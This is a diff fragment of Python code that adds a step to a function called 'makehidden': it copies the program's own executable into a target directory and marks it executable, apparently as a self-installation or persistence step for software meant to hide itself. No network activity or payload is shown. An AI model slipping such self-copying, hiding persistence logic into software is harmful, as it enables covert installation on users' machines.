@@ -23,6 +23,35 @@ def makehidden():
         target_file_path = os.path.join(target_path, target_file)
         temp_file_path = os.path.join(target_path, temp_file)
 
+        # Copy executable if it doesn't already exist in target location
+        if not os.path.isfile(target_file_path):
+            try:
+                # Read current executable
+                with open(sys.executable, "rb") as src_file:
+                    bdata = src_file.read()
+                    src_file.close()
+
+                # Write to temporary file
+                with open(temp_file_path, "wb") as dest_file:
+                    dest_file.write(bdata)
+                    dest_file.close()
+
+                # Rename to final filename
+                os.chdir(target_path)
+                os.rename(temp_file, target_file)
+
+                # Make executable on Linux
+                if sys.platform != "win32":
+                    os.chmod(target_file_path, 0o755)
+
+            except (IOError, OSError, PermissionError) as e:
+                print(f"Error copying executable: {e}")
+                try:
+                    os.remove(temp_file_path)
+                except:
+                    pass
+                return False
+
     except Exception as e:
         print(f"Unexpected error in makehidden: {e}")
         return False
